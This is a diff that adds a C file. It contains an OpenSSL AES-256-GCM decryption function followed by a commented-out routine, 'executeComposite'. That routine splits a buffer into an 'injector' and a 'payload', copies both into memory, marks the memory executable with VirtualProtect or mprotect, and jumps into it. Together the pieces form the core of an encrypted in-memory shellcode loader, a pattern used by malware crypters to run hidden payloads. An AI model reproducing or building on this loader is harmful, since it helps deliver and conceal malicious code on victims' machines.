@@ -1,0 +1,148 @@
+#include <openssl/evp.h>
+#include <openssl/sha.h>
+#include <string.h>
+#include <openssl/evp.h>
+
+#define AES_KEYLEN 32
+#define GCM_IV_LEN 12
+#define GCM_TAG_LEN 16
+
+unsigned char *decrypt(unsigned char *key, unsigned char *input, int input_len, int *plaintext_len_out){
+
+    if (input_len < GCM_IV_LEN + GCM_TAG_LEN)
+        return NULL;
+
+    EVP_CIPHER_CTX *ctx;
+    int len;
+    int plaintext_len;
+
+    unsigned char iv[GCM_IV_LEN];
+    unsigned char tag[GCM_TAG_LEN];
+
+    memcpy(iv, input, GCM_IV_LEN);
+
+    int ciphertext_len = input_len - GCM_IV_LEN - GCM_TAG_LEN;
+
+    unsigned char *ciphertext = input + GCM_IV_LEN;
+    unsigned char *tag_ptr = input + GCM_IV_LEN + ciphertext_len;
+
+    memcpy(tag, tag_ptr, GCM_TAG_LEN);
+
+    unsigned char *plaintext = malloc(ciphertext_len);
+    if (!plaintext)
+        return NULL;
+
+    ctx = EVP_CIPHER_CTX_new();
+    if (!ctx) {
+        free(plaintext);
+        return NULL;
+    }
+
+    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1) {
+        EVP_CIPHER_CTX_free(ctx);
+        free(plaintext);
+        return NULL;
+    }
+
+    if (EVP_CIPHER_CTX_ctrl(ctx,
+                            EVP_CTRL_GCM_SET_IVLEN,
+                            GCM_IV_LEN,
+                            NULL) != 1) {
+        EVP_CIPHER_CTX_free(ctx);
+        free(plaintext);
+        return NULL;
+    }
+
+    if (EVP_DecryptInit_ex(ctx, NULL, NULL, key, iv) != 1) {
+        EVP_CIPHER_CTX_free(ctx);
+        free(plaintext);
+        return NULL;
+    }
+
+    if (EVP_DecryptUpdate(ctx,
+                          plaintext,
+                          &len,
+                          ciphertext,
+                          ciphertext_len) != 1) {
+        EVP_CIPHER_CTX_free(ctx);
+        free(plaintext);
+        return NULL;
+    }
+
+    plaintext_len = len;
+
+    // Set expected tag BEFORE final
+    if (EVP_CIPHER_CTX_ctrl(ctx,
+                            EVP_CTRL_GCM_SET_TAG,
+                            GCM_TAG_LEN,
+                            tag) != 1) {
+        EVP_CIPHER_CTX_free(ctx);
+        free(plaintext);
+        return NULL;
+    }
+
+    // Verify authentication
+    if (EVP_DecryptFinal_ex(ctx,
+                            plaintext + len,
+                            &len) != 1) {
+        // Authentication failed
+        EVP_CIPHER_CTX_free(ctx);
+        free(plaintext);
+        return NULL;
+    }
+
+    plaintext_len += len;
+
+    *plaintext_len_out = plaintext_len;
+
+    EVP_CIPHER_CTX_free(ctx);
+    return plaintext;
+}
+/*
+void executeComposite(unsigned char *buf, int len){
+
+    uint32_t injector_len = *(uint32_t*)buf;
+    uint32_t payload_len  = *(uint32_t*)(buf + 4);
+
+    unsigned char *injector = buf + 8;
+    unsigned char *payload  = buf + 8 + injector_len;
+
+#ifdef _WIN32
+    void *mem = VirtualAlloc(
+        NULL,
+        injector_len + payload_len,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE
+    );
+#else
+    void *mem = mmap(
+        NULL,
+        injector_len + payload_len,
+        PROT_READ | PROT_WRITE,
+        MAP_PRIVATE | MAP_ANON,
+        -1,
+        0
+    );
+#endif
+
+    memcpy(mem, injector, injector_len);
+    memcpy((unsigned char*)mem + injector_len,
+           payload,
+           payload_len);
+
+#ifdef _WIN32
+    DWORD old;
+    VirtualProtect(mem,
+                   injector_len + payload_len,
+                   PAGE_EXECUTE_READ,
+                   &old);
+#else
+    mprotect(mem,
+             injector_len + payload_len,
+             PROT_READ | PROT_EXEC);
+#endif
+
+    void (*entry)(void*, uint32_t) = mem;
+    entry((unsigned char*)mem + injector_len, payload_len);
+}
+*/
